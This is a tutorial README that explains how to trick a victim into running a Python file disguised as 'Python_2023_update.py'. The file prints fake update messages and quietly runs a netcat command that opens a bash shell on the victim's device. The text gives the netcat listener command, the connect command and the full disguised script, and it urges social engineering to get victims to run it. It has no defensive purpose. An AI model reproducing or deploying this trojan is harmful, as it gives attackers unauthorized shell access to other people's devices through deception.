# Hacking-with-Netcat-and-Python
In this method, with the help of [Netcat tool](https://nmap.org/ncat/) you can create a [reverse shell](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) on the victims device, and if you are on the same network you can easily access it. But the problem here is that you cannot always have access to the victims device to execute the ***netcat command*** soo, I got an idea, what if you write a python script which will automate the command for you, and if you add some fancy code that the victim will see on his device before creating a shell, that makes it more appealing. So in this post, I will share this method with you.

## Is it my idea ??
 I think, I got this idea while solving the machines/box. Where, in any input box if you type a command that lets you have a reverse shell on the targets website and you get a shell access on the webserver. All I did was just overthink and take the idea to a next level.

## A Personal note from writer.
  To successfully execute this attack you will need your own research and a little knowledge about [Social Engineering](https://www.imperva.com/learn/application-security/social-engineering-attack/). Also this is my first time creating a proper Github post, soo plz let me know if there is anything missing or something, I did wrong. 

 ## Pre-Installed stuff
 - [Python](https://www.python.org/downloads/) ( on both device )
 - [netcat](https://nmap.org/download.html) ( on both device )

# Method
Its a simple but very effective way that a hacker might use to hack their Target. In this type of attack, the attacker will be on your same network as you and send a python script that if you execute, will open a shell on a certain port that the attacker might connect to and try to do anything on your device. Lets see how its Done...

First Lets understand how to create a Reverse shell with Netcat command, Also if you get any errors plz check the netcat manual or do some research.

## How to create a basic Reverse Shell

***Victim's Device :***
        
  First you need netcat installed on your victim's device, if it's an Android or IOS then install it via Termux or iSH, and if it's Win or Mac install it through [nmap website](https://nmap.org/download.html) (netcat is pre-installed in linux). After installing netcat you just have to open a port where your device will connect (in this example the port will be "4545") and after connection, with the "e" flag we will tell the device which file to execute.
```
nc -l -p 4545 -e bin/bash
```

***Target Device :***

  On your device you also need netcat installed, then as you know the port which is open you can directly connect on it. To connect you must also know the target's IP.
```
nc <IP> 4545
```

And **congratulation** you're now connected to your target device. But, there are chances that target might find it and try to interupt in between, To avoid that we can try my method.

# My Method

For this you need to create a python script which will run this netcat command in the background so the victim will not see it and we can do our work, Also we will add some text that will be displayed so the victim thinks that this is some thing genuine and their for we will also name the file "Python_2023_update.py" you can do [social engineering](https://www.imperva.com/learn/application-security/social-engineering-attack/) to know what kind of files victim is most likely to accept and open.

```
import os
print("Python is updating, Please wait")
os.system("nc -l -p 4545 -e bin/bash")
print("Python is upto date")
```

You now have the the file, you just have to send it to your victim and trick him into opening/run it ( if you don't know how to do it, try Social Engineering ). Ater the target executes the file, you can connect to the port from your device and exploit it.
